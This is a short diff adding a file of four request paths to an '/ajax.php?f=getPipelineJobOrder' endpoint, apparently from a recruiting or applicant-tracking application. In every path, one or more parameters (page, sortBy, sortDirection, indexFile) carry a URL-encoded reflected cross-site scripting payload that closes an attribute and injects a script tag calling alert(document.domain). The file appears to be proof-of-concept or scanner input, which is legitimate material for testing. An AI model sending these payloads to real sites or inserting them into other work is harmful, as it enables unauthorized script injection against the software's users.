@@ -1,0 +1,4 @@
+/ajax.php?f=getPipelineJobOrder&joborderID=50&page=0&entriesPerPage=15&sortBy=dateCreatedInt&sortDirection=desc&indexFile=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&isPopup=0
+/ajax.php?f=getPipelineJobOrder&joborderID=50&page=0&entriesPerPage=15&sortBy=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&sortDirection=desc&indexFile=1&isPopup=0
+/ajax.php?f=getPipelineJobOrder&joborderID=50&page=0&entriesPerPage=15&sortBy=dateCreatedInt&sortDirection=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&indexFile=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&isPopup=0
+/ajax.php?f=getPipelineJobOrder&joborderID=50&page=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&entriesPerPage=15&sortBy=dateCreatedInt&sortDirection=desc&indexFile=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&isPopup=0
